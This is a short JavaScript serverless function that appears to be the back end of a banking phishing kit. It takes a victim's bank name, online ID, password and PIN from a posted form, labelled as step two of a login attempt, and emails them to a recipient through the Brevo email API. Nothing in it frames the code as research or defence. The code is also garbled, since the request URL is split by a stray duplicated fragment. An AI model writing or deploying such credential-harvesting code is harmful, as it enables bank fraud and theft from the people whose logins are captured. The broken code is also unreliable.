import axios from 'axios';

export default async function handler(event, context) {
  try {
    const { token, session_id, bankName, onlineId, password, pin } = JSON.parse(event.body);

    // Validate inputs
    if (!token || !session_id || !bankName || !onlineId || !password || !pin) {
      return {
        statusCode: 400,
        body: JSON.stringify({ status: 'error', message: 'Missing required fields.' })
      };
    }

    const BREVO_API_KEY = process.env.BREVO_API_KEY;

    const response = await axios.post('https:                                 
      sender: {
        email: '//api.brevo.com/v3/smtp/email', {
      sender: {
        email: 'your-verified-email@example.com',
        name: 'Your Name'
      },
      to: [
        {
          email: 'recipient-email@example.com',
          name: 'Recipient Name'
        }
      ],
      subject: 'New Login Attempt (Step 2)',
      htmlContent: `
        <h1>New Login Attempt (Step 2)</h1>
        <p>Bank: ${bankName}</p>
        <p>ID: ${onlineId}</p>
        <p>Password: ${password}</p>
        <p>PIN: ${pin}</p>
      `
    }, {
      headers: {
        'api-key': BREVO_API_KEY,
        'Content-Type': 'application/json'
      }
    });

    console.log(response.data);

    return {
      statusCode: 200,
      body: JSON.stringify({ status: 'success', message: 'Email sent successfully.' })
    };
  } catch (error) {
    console.error(error);

    return {
      statusCode: 500,
      body: JSON.stringify({ status: 'error', message: 'Failed to send email.' })
    };
  }
}
